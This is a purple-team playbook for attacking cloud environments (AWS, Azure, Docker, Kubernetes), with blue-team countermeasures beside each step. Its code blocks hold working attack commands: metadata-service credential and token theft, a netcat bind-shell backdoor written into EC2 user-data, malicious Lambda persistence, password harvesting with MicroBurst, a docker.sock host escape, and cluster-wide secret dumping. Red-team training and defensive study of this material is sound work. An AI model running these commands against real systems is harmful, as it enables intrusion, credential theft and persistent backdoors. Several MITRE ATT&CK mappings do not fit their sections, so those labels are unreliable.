# Cloud attack playbook

## AWS exploitation & defence

### Attack paths

* Initial access: Abuse IAM misconfigurations (weak roles, keys, or AssumeRole policies).
* Persistence: Backdoor EC2 via SSM, user data, or malicious Lambda functions.
* Exfiltration: Exploit overly permissive S3 buckets or VPC peering.

#### Initial access: AWS credential theft

MITRE: [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)

Tools:

```bash
# Check for metadata service exposure (IMDSv1)  
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  
# Enumerate IAM roles with AWS CLI  
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[].Principal.AWS==`*`].Arn'  
```

Purple team actions:

- [x] Red: Use Pacu to automate IAM privilege escalation.
- [x] Blue: Enforce IMDSv2 and monitor AssumeRole anomalies with GuardDuty.

#### Persistence: Backdooring Lambda/EC2

MITRE: [T1574.006 - Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)

Tools:

```bash
# Backdoor EC2 via user-data  
echo 'nc -lvp 4444 -e /bin/sh' >> /var/lib/cloud/scripts/user-data  
# Persist via Lambda (Python example)  
aws lambda create-function --function-name "LegitFunction" --runtime python3.8 --role <backdoored-role-arn> --handler lambda_function.handler --zip-file fileb://malicious.zip  
```

Purple team actions:

- [x] Red: Test Lambda persistence with Lambda-Proxy.
- [x] Blue: Use AWS Config to audit Lambda execution roles and EC2 user-data modifications.

## Azure exploitation & defence

### Attack paths

* Initial access: Phish Azure AD credentials or exploit OAuth app consent flaws.
* Privilege escalation: Abuse managed identities or Role-Based Access Control (RBAC) gaps.
* Lateral movement: Leverage Azure Resource Manager (ARM) APIs for cross-tenant attacks.

#### Initial access: Azure AD Phishing

MITRE: [T1098.001 - Account Manipulation: Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001/)

Tools:

```powershell
# Harvest OAuth tokens with MicroBurst  
Import-Module .\Get-AzurePasswords.ps1  
Get-AzurePasswords -ExportTo CSV  
```

Purple team actions:

- [x] Red: Simulate token theft with Stormspotter.
- [x] Blue: Enable Azure AD Identity Protection and conditional access policies.

#### Privilege escalation: Managed identity abuse

MITRE: [T1530 - Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)

Tools:

```bash
# List managed identities  
az identity list --query "[].{Name:name, PrincipalId:principalId}"  
# Steal tokens from a VM with managed identity  
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H "Metadata: true"  
```

Purple team actions:

- [x] Red: Use ROADtools to pivot across tenants.
- [x] Blue: Restrict managed identity scope via Azure Policy.

## Container breakouts

### Attack paths

* Initial Access: Exploit exposed Docker APIs or vulnerable container images.
* Privilege Escalation: Abuse kernel capabilities (e.g., CAP_SYS_ADMIN) or host mounts.
* Persistence: Deploy malicious sidecar containers in Kubernetes.

Privilege Escalation: Docker Sock Exploit

MITRE: [T1611 - Escape to Host](https://attack.mitre.org/techniques/T1611/)

Tools:

```bash
# Escape via Docker socket  
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash  
# Check for dangerous capabilities  
capsh --print | grep "cap_sys_admin"  
```

Purple team actions:

- [x] Red: Use CDK for automated container escapes.
- [x] Blue: Deploy Falco to monitor `docker.sock` access.

## Kubernetes cluster attacks

### Attack paths

* Initial access: Compromise kubelets, exposed dashboards, or weak kubeconfig files.
* Lateral movement: Abuse service account tokens or vulnerable admission controllers.
* Persistence: Deploy shadow pods or cronjobs in high-privilege namespaces.

#### Lateral Movement: Compromised Service Account

MITRE: [T1526 - Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/)

Tools:

```bash
# List secrets (including service account tokens)  
kubectl get secrets --all-namespaces  
# Use token to query Kubernetes API  
curl -k -H "Authorization: Bearer <token>" https://<k8s-api>/api/v1/namespaces  
```

Purple team actions:

- [x] Red: Simulate RBAC bypass with rbac-tool.
- [x] Blue: Enable Kubernetes audit logs and enforce network policies.

## Purple team outcomes

### Red team

* Document attack TTPs (Tactics, Techniques, Procedures) and evasion methods.

### Blue team

* Generate detection rules (Sigma, KQL) and harden configurations.

### Final deliverable

A joint report mapping exploits to mitigations, with tabletop exercises for validation.

Style notes:

* Uses clear headings for each cloud platform.
* Balances offense/defense with actionable Purple Team tasks.
* Modular—teams can focus on AWS/Azure/K8s separately.
